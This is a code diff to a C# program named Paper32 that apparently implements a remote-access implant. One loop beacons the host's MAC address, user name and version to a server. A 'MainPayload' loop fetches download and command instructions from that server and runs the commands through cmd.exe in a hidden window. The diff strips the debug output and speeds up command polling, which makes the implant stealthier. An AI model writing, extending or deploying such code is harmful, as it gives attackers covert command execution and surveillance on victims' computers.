@@ -16,16 +16,15 @@ namespace Paper32
         {
             while (true)
             {
-                Console.WriteLine("Doing a TRACE");
                 ApiClient.DoTrace(Info.URL, Info.Mac, Info.User, Info.Version);
-                Thread.Sleep(1000);
+                Thread.Sleep(45000);
             }
         }
         static public void MainPayload()
         {
             while (true)
             {
-                Thread.Sleep(10000);
+                Thread.Sleep(3000);
                 try
                 {
                     ApiClient c = new ApiClient(Info.URL, Info.Mac, Info.User, Info.HTTPAuth);
@@ -34,15 +33,8 @@ namespace Paper32
                     string source = new Regex(@"Source: (.*?);;;;").Match(inst).Groups[1].Value;
                     string dest = new Regex(@"Destination: (.*?);;;;").Match(inst).Groups[1].Value;
                     string command = new Regex(@"Command: (.*?);;;;").Match(inst).Groups[1].Value;
-                    Console.WriteLine(it);
-                    Console.WriteLine(source);
-                    Console.WriteLine(dest);
-                    Console.WriteLine(command);
                     if (it == "download")
                     {
-                        Console.WriteLine(it);
-                        Console.WriteLine(source);
-                        Console.WriteLine(dest);
                         if (source == "" || dest == "")
                         {
                             continue;
@@ -90,11 +82,9 @@ namespace Paper32
                         }
                         try
                         {
-                            Console.WriteLine("Executed");
                             Process p = new Process();
                             p.StartInfo.FileName = "cmd.exe"; // start "" "path"
                             p.StartInfo.Arguments = "/C " + command;
-                            Console.WriteLine(command);
                             p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; // Make a system to choose the style mode
                             p.Start();
                             while (p.HasExited) ;
